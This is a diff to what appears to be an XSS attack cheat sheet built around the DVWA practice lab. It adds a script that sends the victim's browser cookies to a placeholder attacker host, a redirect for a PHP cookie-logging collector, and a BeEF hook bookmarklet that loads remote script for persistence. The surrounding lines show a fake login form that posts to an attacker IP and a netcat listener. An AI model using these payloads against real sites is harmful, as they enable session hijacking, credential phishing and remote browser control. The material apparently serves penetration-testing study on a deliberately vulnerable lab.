@@ -16,12 +16,20 @@ Password:<br><input type="password" name="password"></br>
 http://dvwa.local/dvwa/vulnerabilities/xss_r/?name=<h3>Login</h3><form action=http://<attacker_IP> Username:<br><input type="username" name="username"></br> Password:<br><input type="password" name="password"></br> <br><input type="submit" value="Logon"></br>
 ```
 
+```js
+<script type="text/javascript">
+document.location='http[s]//<IP>/cookies.php?cookie='+document.cookie;
+</script>
+```
+
 ```
 $ sudo nc -lnvp 80
 ```
 
 ```php
 <?php
+header('Location: http://dvwa.local/dvwa/');
+
 $cookie = $_GET['cookie'];
 $fp = fopen('cookies.txt', 'a+');
 fwrite($fp, 'Cookie:' . $cookie . "\r\n");
@@ -46,6 +54,10 @@ TODO: refer to the link to use responder to grab ntlm hashes on a windows target
 ```
 
 TODO: Convince the user to click a link or button to add a bookmark using bookmarklet via XSS for persistence
+
+```
+javascript: (function () { var url = 'http://0.0.0.0:3000/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();
+```
 
 ---
 ## References
